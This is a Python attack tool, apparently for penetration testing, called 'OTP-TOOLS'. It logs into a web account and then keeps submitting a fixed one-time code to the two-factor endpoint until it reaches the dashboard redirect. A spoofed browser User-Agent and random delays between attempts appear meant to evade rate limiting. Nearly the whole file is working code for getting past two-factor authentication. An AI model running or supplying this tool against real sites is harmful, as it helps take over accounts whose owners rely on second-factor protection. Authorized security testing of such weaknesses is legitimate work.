import requests
import time
import random

class FixedOTPAuthenticator:
    def __init__(self, login_url, otp_url, dashboard_url, min_delay, max_delay):
        """
        Initializes the class with the necessary URLs and the time interval.
        """
        self.login_url = login_url
        self.otp_url = otp_url
        self.dashboard_url = dashboard_url
        self.session = requests.Session()
        self.min_delay = min_delay
        self.max_delay = max_delay

    def login(self, credentials):
        """
        Performs the initial login with provided credentials.
        """
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        response = self.session.post(self.login_url, data=credentials, headers=headers)
        if response.status_code == 200:
            print("[INFO] Login request sent successfully.")
        else:
            print(f"[ERROR] Login failed with status code {response.status_code}")
        return response

    def submit_otp(self, otp):
        """
        Submits the OTP code for two-factor authentication.
        """
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        otp_data = {f'code-{i+1}': digit for i, digit in enumerate(otp)}  # Split OTP into parts if necessary
        response = self.session.post(self.otp_url, data=otp_data, headers=headers, allow_redirects=False)
        return response

    def is_authenticated(self, response):
        """
        Checks if the user is authenticated based on the redirect to the logged-in area.
        """
        if response.status_code == 302 and self.dashboard_url in response.headers.get('Location', ''):
            return True
        return False

    def try_fixed_otp(self, credentials, otp):
        """
        Performs the login and repeatedly tries the fixed OTP until authentication is successful.
        """
        # Step 1: Login
        login_response = self.login(credentials)
        if login_response.status_code != 200:
            print("[ERROR] Login failed. Check credentials or server availability.")
            return False

        # Step 2: Loop to try fixed OTP
        print("[INFO] Starting fixed OTP attempts...")
        while True:
            print(f"[DEBUG] Trying fixed OTP: {otp}")
            otp_response = self.submit_otp(otp)

            if self.is_authenticated(otp_response):
                print(f"[SUCCESS] Authentication successful with OTP: {otp}")
                return otp  # Return the valid OTP
            else:
                print(f"[INFO] OTP {otp} failed. Retrying...")

            # Add a random delay between attempts within the specified range
            delay = random.uniform(self.min_delay, self.max_delay)
            print(f"[DEBUG] Waiting for {delay:.2f} seconds before retrying...")
            time.sleep(delay)

# Script setup
if __name__ == "__main__":
    print("==================")
    print("==================")
    print("=====OTP-TOOLS====")
    print("==================")
    print("==================")
    print("Made by @Yan")
    
    # Request user information
    login_url = input("\033[92mEnter the login URL: \033[0m").strip()
    otp_url = input("\033[92mEnter the OTP submission URL: \033[0m").strip()
    dashboard_url = input("\033[92mEnter the logged-in area URL: \033[0m").strip()
    
    # Credentials and fixed OTP
    credentials = {
        'email': input("\033[92mEnter your email: \033[0m").strip(),
        'password': input("\033[92mEnter your password: \033[0m").strip(),
    }
    
    # Input for fixed OTP with highlight
    otp = input("\033[92mEnter the fixed OTP to try (e.g., '1234'): \033[0m").strip()

    # Input for minimum and maximum time delay between attempts
    min_delay = float(input("\033[92mEnter the minimum delay between OTP attempts (in seconds): \033[0m").strip())
    max_delay = float(input("\033[92mEnter the maximum delay between OTP attempts (in seconds): \033[0m").strip())

    # Instantiate the class and try to authenticate with fixed OTP
    authenticator = FixedOTPAuthenticator(login_url, otp_url, dashboard_url, min_delay, max_delay)
    valid_otp = authenticator.try_fixed_otp(credentials, otp)

    if valid_otp:
        print(f"[INFO] Authentication completed successfully with OTP: {valid_otp}")
    else:
        print("[ERROR] Authentication failed.")
